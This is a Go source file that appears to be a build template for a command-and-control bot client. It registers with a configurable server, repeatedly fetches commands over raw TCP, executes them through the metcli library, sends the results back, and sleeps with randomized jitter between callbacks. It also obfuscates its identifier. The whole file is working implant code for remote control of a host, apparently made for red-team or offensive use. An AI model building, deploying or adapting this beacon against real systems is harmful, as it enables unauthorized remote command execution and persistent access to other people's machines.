package main

import (
	"bufio"
	"github.com/degenerat3/metcli"
	"math/rand"
	"net"
	"os"
	"time"
)

// SERV : server to call
var SERV = "&&SERV&&"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = string(MAGICTERM)

//REGFILE is where the registration info for this bot is kept
var REGFILE = "&&REGFILE&&"

//INTERVAL is how long the sleep is between callbacks (if run in loop mode)
var INTERVAL = &&INTERVAL&&

//DELTA is the +/- variance in interval time
var DELTA = &&DELTA&&

//OBFSEED is the seed int that will get used for uuid obfuscation
var OBFSEED = 5

//OBFTEXT is the seed text that will get used for uuid obfuscation
var OBFTEXT = "&&OBFTEXT&&"

func send(payload string, m metcli.Metclient) string {
	conn, err := net.Dial("tcp4", SERV)
	if err != nil {
		panic(err)
	}
	outText := []byte(payload)
	conn.Write(outText)
	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
	if err != nil {
		return "0:0:0"
	}
	respStr := string(message)
	decResp := metcli.DecodePayload(respStr, m)
	conn.Close()
	return decResp
}

func main() {
	m := metcli.GenClient(SERV, MAGIC, MAGICSTR, MAGICTERM, MAGICTERMSTR, REGFILE, INTERVAL, DELTA, OBFSEED, OBFTEXT)
	argslen := len(os.Args)
	for {
		p := metcli.PreCheck(m)
		if p != "registered" {
			send(p, m)
		}
		comPL := metcli.GenGetComPL(m)
		comstr := send(comPL, m)
		res := metcli.HandleComs(comstr, m)
		if len(res) > 0 {
			send(res, m)
		}
		if argslen > 1 {
			os.Exit(0)
		}
		min := INTERVAL - DELTA
		max := INTERVAL + DELTA
		sleeptime := rand.Intn(max-min) + min
		time.Sleep(time.Duration(sleeptime) * time.Second)
	}
}
